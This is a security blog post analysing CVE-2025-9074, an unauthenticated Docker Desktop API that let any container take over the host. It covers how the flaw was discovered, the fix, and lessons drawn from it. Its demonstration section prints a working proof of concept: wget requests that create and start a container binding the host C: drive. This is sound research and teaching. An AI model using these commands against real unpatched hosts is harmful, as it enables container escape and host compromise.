---
title: "Breaking Out: Understanding CVE-2025-9074 in Docker Desktop"
description: "A deep dive into CVE-2025-9074, a critical vulnerability in Docker Desktop that allowed complete host compromise from any container with just two HTTP requests."
date: "2025-09-04"
author: "Samson Otori"
category: "Insights"
tags: ["CVE", "Docker", "Container Security", "Vulnerability Analysis", "Exploit", "Zero Trust", "Security Research"]
image: "/images/blog/docker security BReach NEW.png"
---

# Breaking Out: Understanding CVE-2025-9074 in Docker Desktop

Containers have revolutionized how we build, ship, and deploy applications. Unlike virtual machines, which package an entire operating system alongside the application, containers provide only the code and its dependencies, running on the host kernel. This makes them lightweight, portable, and fast to deploy.

In my home lab, I rely heavily on Docker for running security tools, test environments, and quick experiments. Containers allow me to isolate different services, but this isolation comes with a caveat: it is only as strong as the implementation behind it. A recently disclosed flaw, CVE-2025-9074, demonstrates that container isolation can be far weaker than we think. This vulnerability revealed a simple oversight in Docker Desktop that allowed full host compromise from any container with just two HTTP requests.

## The Vulnerability

CVE-2025-9074 affected Docker Desktop on Windows and macOS prior to version 4.44.3. The issue was that the Docker API, which should have been restricted, was accessible from any container without authentication. From there, an attacker could create a privileged container, mount the host's C: drive, and interact directly with the filesystem.

The result was a complete breakdown of container boundaries. An attacker did not need complex exploitation chains or advanced privilege escalation tricks. With only two requests to the Docker API, isolation was shattered. This vulnerability carried a severity score of 9.3 out of 10, which reflects its potential impact.

## Discovery Story

The researcher, Felix Boulet, uncovered this flaw almost by accident. While scanning the internal environment of a container with Nmap, he noticed the exposed Docker API on the network. Out of curiosity, he probed it further and quickly realized that it accepted unauthenticated requests. This allowed him to interact directly with the Docker daemon, the central service responsible for creating and managing containers.

Collaborating with Philippe Dugre, another container expert, Felix confirmed that the same oversight affected macOS as well. The discovery was a reminder that sometimes the most dangerous bugs come from the simplest assumptions: "internal" services are not always safe by default.

## Technical Walkthrough

In theory, Docker containers should remain jailed. They operate in separate namespaces, cannot touch the host filesystem unless explicitly configured, and are prevented from interfering with one another. In this case, however, the Docker API (192.168.65.7:2375) was wide open.

The exploit worked in two steps. First, the attacker would send a POST request to create a new container that bound the host's C: drive into the container at a directory called /host_root. A simple command could then be specified to write or read files from that mount point. Second, another POST request would start the container, executing the command against the host filesystem.

This was enough to create arbitrary files on the host, steal sensitive data, or prepare persistence mechanisms such as startup tasks or scheduled jobs. It did not require direct code execution on the container, an SSRF vulnerability in a containerized web application could have been enough to trigger it.

## Demonstration: From Container to Host

To verify the Docker Desktop escape vulnerability, I reproduced the proof of concept on my own test system running Docker Desktop 4.44.1 (vulnerable). Below is a walk-through of the key steps.

### Step 1: Launch a Container

I started with a lightweight Alpine container and opened an interactive shell:

**Terminal →**

`docker run -it alpine /bin/sh`

This dropped me into a root shell inside the container, ready to issue commands.

### Step 2: Confirm API Exposure

Inside the container, I confirmed that the internal Docker API was reachable at http://192.168.65.7:2375.

**Terminal →**

`wget --timeout=3 --tries=1 -qO- http://192.168.65.7:2375/_ping`

The expected response is simply:

**Terminal →**

`OK`

This confirmed that the container could talk directly to the Docker service API on the host.

### Step 3: Create a Privileged Container with Host Mount

Next, I issued a POST request to create a new container with the host C: drive mounted. The JSON payload instructed Docker to bind the Windows host C:\ drive into the container at /host_root and to write a test file:

**Terminal →**

`wget --header='Content-Type: application/json' \ --post-data='{"Image":"alpine","Cmd":["sh","-c","echo pwned > /host_root/pwn.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \ -O - http://192.168.65.7:2375/containers/create > create.json`

The output returned a container ID:

**Terminal →**

`{"Id":"8cd5867ade9a5b73409763d03907d2ef321b90064fac16b63eddfb0e488e9571","Warnings":[]}`

This meant the container had been created with access to the host file system.

### Step 4: Start the Container

With the container created, I started it using another simple POST:

**Terminal →**

`cid=$(cut -d'"' -f4 create.json) wget --post-data='' -O - http://192.168.65.7:2375/containers/$cid/start`

The expected response was an empty body with a 204 status code, meaning the container successfully started.

### Step 5: Verify Host Compromise

Finally, I checked the Windows C:\ drive for the file written by the container:

**Terminal →**

`C:\docker_cve_test\pwn.txt`

The file contained the word:

**Terminal →**

`pwned`

This confirmed that the container had broken isolation and was able to write directly to the host file system, proving the vulnerability in action.

<InlineGallery images={docker-cve-demonstration} title="Docker CVE-2025-9074 Proof of Concept Demonstration" />

**⚠️ Safety Note**

This demonstration was carried out in a controlled lab environment using an intentionally vulnerable version of Docker Desktop. Do not attempt this on production systems, work laptops, or any environment that contains sensitive data. Always use isolated test machines when experimenting with security vulnerabilities.

## Why It Matters

This vulnerability illustrates how dangerous it is to assume internal APIs or control planes are inherently safe. In a production environment, it could have meant a malicious container escaping its sandbox entirely, with access to host data and applications. Even in my home lab, where Docker is often used for security testing, this flaw was a reminder that one container could have compromised the entire environment.

The real danger lies in how easy it was. Just two HTTP requests were enough to undo Docker's core promise of isolation.

## Lessons Learned

The patch in version 4.44.3 closed the hole, but the lessons extend far beyond Docker itself. Every internal service should require authentication, no matter how "hidden" it seems. Network segmentation between containers and the host must be enforced, and zero-trust principles should apply within containerized environments just as much as they do at the perimeter.

Regular scanning of container networks is equally important. Felix discovered this flaw simply by running Nmap on the documented private Docker network. Had organizations been running similar checks, they might have caught the issue themselves.

## Conclusion

CVE-2025-9074 serves as a critical reminder: container isolation is not infallible. For anyone running Docker Desktop on Windows or macOS, updating to version 4.44.3 or later is essential. For security professionals, the vulnerability reinforces the need to test assumptions, audit internal interfaces, and apply zero-trust principles throughout the environment.

In my own lab, Docker remains a powerful and flexible tool, but this experience has reinforced the need for vigilance. Even mature platforms can harbor oversights, and sometimes, breaking out of a container is as easy as running two lines of code.

## Further Reading

For further details, you can explore:

- [CVE-2025-9074 Record](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074)
- [Docker Desktop 4.44.3 Release Notes](https://docs.docker.com/desktop/release-notes/)
- [Felix Boulet's Original Write-up](https://blog.qwertysecurity.com/Articles/blog3.html)
